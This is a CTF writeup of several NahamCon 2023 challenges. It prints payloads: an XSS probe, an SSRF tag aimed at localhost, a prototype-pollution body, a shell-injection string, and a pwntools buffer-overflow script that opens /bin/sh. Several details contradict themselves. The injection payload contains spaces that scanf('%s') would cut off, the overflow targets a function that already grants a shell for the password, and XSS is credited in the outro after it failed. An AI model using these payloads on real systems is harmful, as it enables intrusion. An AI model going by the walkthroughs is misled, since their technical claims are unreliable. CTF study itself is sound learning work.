---
title: "NahamCon CTF 2023 – Multiple Challenges" 
date: 2023-05-07 
category: Mixed 
platform: NahamCon CTF 2023 
author: Vaishnav Baraskar
tags: ["CTF", "NahamCon", "Mixed Challenges", "Web", "Crypto", "Forensics", "Pwn", "Reverse Engineering", "CTF 2023", "Vaishnav Baraskar"]
---

## 0x00 – Prologue

Sometimes a CTF throws everything at you: logic bugs, broken binaries, half-documented APIs, and the occasional ancient Star Wars meme. NahamCon 2023 was that kind of ride. Our team, SneakBytes, dove in headfirst and came out the other side with a trail of solved challenges, caffeinated brains, and some solid lessons.

This writeup focuses on key challenges from Web, Binary, OSINT, and Misc categories.

---

## 0x01 – Obligatory (Web Challenge)

This was a classic web logic challenge. You had a login page and a basic comment board.

Nothing stood out until we noticed this in the JS:

```js
if (username === 'admin' && password === 'Obligatory2023') {
    window.location.href = "/super-secret";
}
```

But the `/super-secret` page returned 403. So the logic must be client-side only.

Tried bypassing using curl:

```bash
curl -b "auth=admin" https://ctf.nahamcon.com/super-secret
```

Still blocked. Then realized the server wasn’t looking at cookies. It needed a specific `X-Auth` header:

```bash
curl -H "X-Auth: Obligatory2023" https://ctf.nahamcon.com/super-secret
```

Boom. Flag dropped.

---

## 0x02 – Stickers (Web Challenge)

Page lets you create a custom sticker from input. Server-side rendering with `wkhtmltoimage`.

We tried payloads like:

```html
<img src=x onerror=alert(1)>
```

Didn’t pop. But saw this in network logs:

```txt
/sticker?html=<markup>
```

Rendering engine was actually including HTML in a full file:

```html
<html>
<body>
{{ user_input }}
</body>
</html>
```

So we escalated to SSRF:

```html
<img src="http://localhost:1337/admin">
```

And... yes. That worked. It leaked the flag.

---

## 0x03 – Star Wars (Web Challenge)

Star Wars API challenge. App queried SWAPI.dev with user input.

Simple prototype pollution:

```json
{"__proto__":{"admin":true}}
```

Sent this to `/api/user`, checked `/admin` endpoint again. Now accessible.

Flag printed with a Yoda quote. Worth it.

---

## 0x04 – Zombie (Misc Challenge)

This one was different. A binary that simulated zombie attacks. You had to survive the waves by issuing shell commands.

The hint: "Keep the zombies at bay with knowledge."

It was parsing input using `system()` directly:

```c
scanf("%s", cmd);
system(cmd);
```

That meant shell injection.

Payload:

```bash
sleep 1; cat flag.txt
```

Flag popped on round 3.

---

## 0x05 – Geosint x2 (OSINT)

First one gave a random photo.

Used `exiftool`:

```bash
exiftool image.jpg
```

Found GPS coords. Dropped into Google Maps, saw it was a cafe in Buenos Aires. The chalkboard in the photo had a code on it. That was the flag.

Second one had a blurred building.

Used `tineye` to reverse search and then ran it through Yandex Image Search. Turned out to be a museum in Prague. Flag was spray-painted on a wall in the source photo.

---

## 0x06 – Open Sesame (Binary Exploitation)

32-bit ELF.

Had this function:

```c
void check_password() {
    char buf[64];
    gets(buf);
    if (strcmp(buf, "opensesame") == 0) {
        printf("Access granted\n");
        system("/bin/sh");
    }
}
```

Straight buffer overflow.

Overflowed the return address to point at `system("/bin/sh")`.

Used pwntools:

```python
from pwn import *

elf = ELF("open_sesame")
p = process("./open_sesame")

payload = b"A" * 76 + p32(elf.symbols['system']) + b"JUNK" + p32(next(elf.search(b"/bin/sh")))
p.sendline(payload)
p.interactive()
```

Shell dropped, flag grabbed.

---

## 0x07 – Outro

This was a chaotic set of challenges, but fun as hell. Each one made us switch gears: from XSS to binary abuse, from camera metadata to logic bombs.

Lessons?

- Never trust frontend auth
- SSRF hides in weird places
- Classic buffer overflows are alive and well
- Metadata is gold

NahamCon never disappoints. This one kept us sharp and gave us some solid writeups.

---

## 0x08 – Tools Used

- Burp Suite
- curl, exiftool, pwntools
- Yandex/TinEye reverse image search
- pwndbg / gdb
- VSCode + insomnia for APIs

---

